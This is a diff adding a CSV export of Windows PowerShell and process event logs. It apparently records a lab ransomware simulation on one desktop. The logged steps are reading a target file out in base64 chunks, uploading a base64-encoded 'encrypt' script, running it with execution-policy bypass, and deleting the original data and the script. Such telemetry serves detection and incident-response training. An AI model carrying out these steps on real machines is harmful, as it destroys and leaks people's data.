@@ -1,0 +1,3559 @@
+"_time","event.code","host.name","winlog.event_data.CommandLine","winlog.event_data.ScriptBlockText"
+"2025-11-16T07:10:38.725+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:13:09.686+0000","1
+1","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","""C:\Windows\system32\whoami.exe""
+""C:\Windows\system32\whoami.exe""","null
+null"
+"2025-11-16T07:15:19.159+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:15:24.144+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:15:34.983+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files
+'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files
+'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:15:39.101+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:19:42.108+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cat data_important.txt
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cat data_important.txt
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:19:50.856+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-item 'C:\Program Files\data_important.txt').length
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-item 'C:\Program Files\data_important.txt').length
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:19:51.271+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 0
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 0
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:19:51.766+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 77
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 77
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:19:51.894+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:20:03.814+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""7b9fb1977f73c7229b9e9394a58ce346d746ff6a"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""7b9fb1977f73c7229b9e9394a58ce346d746ff6a"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:20:04.004+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:20:04.109+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSByYSBmaWxlIC5lbmNyeXB0ZWQgTeG7mkkKIyBRVUFOIFRS4buMTkc6IEtow7RuZyB4w7NhIGhheSB0aGF5IMSR4buVaSBmaWxlIGfhu5FjLgoKcGFyYW0gKAogICAgIyBOaOG6rW4gdGhhbSBz4buRIGzDoCDEkcaw4budbmcgZOG6q24gZmlsZSBt4bulYyB0acOqdQogICAgW3N0cmluZ10kUGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXGRhdGFfaW1wb3J0YW50LnR4dCIKKQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIlsqXSBCYXQgZGF1IG1vIHBob25nLi4uIERvYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaWVtIHRyYSBmaWxlIHRvbiB0YWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkxvaTogS2hvbmcgdGltIHRoYXkgZmlsZSBtdWMgdGlldTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgRG9jIG5vaSBkdW5nIGZpbGUKICAgICRjb250ZW50Qnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAKICAgICMgTWEgaG9hIEJhc2U2NCAobW8gcGhvbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIERpbmggbmdoaWEgdGVuIGZpbGUgbW9pCiAgICAkbmV3RW5jcnlwdGVkUGF0aCA9ICRQYXRoICsgIi5lbmNyeXB0ZWQiCiAgICAKICAgICMgR2hpIG5vaSBkdW5nIGRhICJtYSBob2EiIHJhIGZpbGUgbW9pCiAgICBTZXQtQ29udGVudCAtUGF0aCAkbmV3RW5jcnlwdGVkUGF0aCAtVmFsdWUgJGJhc2U2NENvbnRlbnQKICAgIAogICAgV3JpdGUtSG9zdCAiWytdIFRoYW5oIGNvbmchIERhIG1vIHBob25nIG1hIGhvYSBmaWxlLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGdvYyB2YW4gYW4gdG9hbjogJFBhdGgiCiAgICBXcml0ZS1Ib3N0ICJbK10gRmlsZSBtb2kgZGEgdGFvOiAkbmV3RW5jcnlwdGVkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkdhcCBsb2k6ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSByYSBmaWxlIC5lbmNyeXB0ZWQgTeG7mkkKIyBRVUFOIFRS4buMTkc6IEtow7RuZyB4w7NhIGhheSB0aGF5IMSR4buVaSBmaWxlIGfhu5FjLgoKcGFyYW0gKAogICAgIyBOaOG6rW4gdGhhbSBz4buRIGzDoCDEkcaw4budbmcgZOG6q24gZmlsZSBt4bulYyB0acOqdQogICAgW3N0cmluZ10kUGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXGRhdGFfaW1wb3J0YW50LnR4dCIKKQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIlsqXSBCYXQgZGF1IG1vIHBob25nLi4uIERvYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaWVtIHRyYSBmaWxlIHRvbiB0YWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkxvaTogS2hvbmcgdGltIHRoYXkgZmlsZSBtdWMgdGlldTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgRG9jIG5vaSBkdW5nIGZpbGUKICAgICRjb250ZW50Qnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAKICAgICMgTWEgaG9hIEJhc2U2NCAobW8gcGhvbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIERpbmggbmdoaWEgdGVuIGZpbGUgbW9pCiAgICAkbmV3RW5jcnlwdGVkUGF0aCA9ICRQYXRoICsgIi5lbmNyeXB0ZWQiCiAgICAKICAgICMgR2hpIG5vaSBkdW5nIGRhICJtYSBob2EiIHJhIGZpbGUgbW9pCiAgICBTZXQtQ29udGVudCAtUGF0aCAkbmV3RW5jcnlwdGVkUGF0aCAtVmFsdWUgJGJhc2U2NENvbnRlbnQKICAgIAogICAgV3JpdGUtSG9zdCAiWytdIFRoYW5oIGNvbmchIERhIG1vIHBob25nIG1hIGhvYSBmaWxlLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGdvYyB2YW4gYW4gdG9hbjogJFBhdGgiCiAgICBXcml0ZS1Ib3N0ICJbK10gRmlsZSBtb2kgZGEgdGFvOiAkbmV3RW5jcnlwdGVkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkdhcCBsb2k6ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:20:04.189+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:20:13.822+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:20:14.323+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi ra file .encrypted Má»šI
+# QUAN TRá»ŒNG: KhÃ´ng xÃ³a hay thay Ä‘á»•i file gá»‘c.
+
+param (
+    # Nháº­n tham sá»‘ lÃ  Ä‘Æ°á»ng dáº«n file má»¥c tiÃªu
+    [string]$Path = ""C:\Program Files\data_important.txt""
+)
+
+try {
+    Write-Host ""[*] Bat dau mo phong... Doc file: $Path""
+    
+    # Kiem tra file ton tai
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Loi: Khong tim thay file muc tieu: $Path""
+        exit
+    }
+
+    # Doc noi dung file
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Ma hoa Base64 (mo phong 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Dinh nghia ten file moi
+    $newEncryptedPath = $Path + "".encrypted""
+    
+    # Ghi noi dung da ""ma hoa"" ra file moi
+    Set-Content -Path $newEncryptedPath -Value $base64Content
+    
+    Write-Host ""[+] Thanh cong! Da mo phong ma hoa file.""
+    Write-Host ""[+] File goc van an toan: $Path""
+    Write-Host ""[+] File moi da tao: $newEncryptedPath""
+
+} catch {
+    Write-Error ""Gap loi: $_.Exception.Message""
+}
+# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi ra file .encrypted Má»šI
+# QUAN TRá»ŒNG: KhÃ´ng xÃ³a hay thay Ä‘á»•i file gá»‘c.
+
+param (
+    # Nháº­n tham sá»‘ lÃ  Ä‘Æ°á»ng dáº«n file má»¥c tiÃªu
+    [string]$Path = ""C:\Program Files\data_important.txt""
+)
+
+try {
+    Write-Host ""[*] Bat dau mo phong... Doc file: $Path""
+    
+    # Kiem tra file ton tai
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Loi: Khong tim thay file muc tieu: $Path""
+        exit
+    }
+
+    # Doc noi dung file
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Ma hoa Base64 (mo phong 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Dinh nghia ten file moi
+    $newEncryptedPath = $Path + "".encrypted""
+    
+    # Ghi noi dung da ""ma hoa"" ra file moi
+    Set-Content -Path $newEncryptedPath -Value $base64Content
+    
+    Write-Host ""[+] Thanh cong! Da mo phong ma hoa file.""
+    Write-Host ""[+] File goc van an toan: $Path""
+    Write-Host ""[+] File moi da tao: $newEncryptedPath""
+
+} catch {
+    Write-Error ""Gap loi: $_.Exception.Message""
+}"
+"2025-11-16T07:20:23.026+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","rm data_important.txt
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+rm data_important.txt
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:20:31.548+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","rm encrypt.ps1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+rm encrypt.ps1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:20:34.356+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:23:56.163+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:23:59.997+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:24:04.554+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:24:10.475+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:24:11.504+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:24:20.565+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""37e238e7b8049f3927512a101bd4af1b5db60fa8"" = @{
+    ""target"" = ""C:\Program Files\data_important.txt"";
+    ""src_basename"" = ""data_important.txt"";
+    ""dst"" = ""C:\Program Files\data_important.txt""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""37e238e7b8049f3927512a101bd4af1b5db60fa8"" = @{
+    ""target"" = ""C:\Program Files\data_important.txt"";
+    ""src_basename"" = ""data_important.txt"";
+    ""dst"" = ""C:\Program Files\data_important.txt""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:24:20.694+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
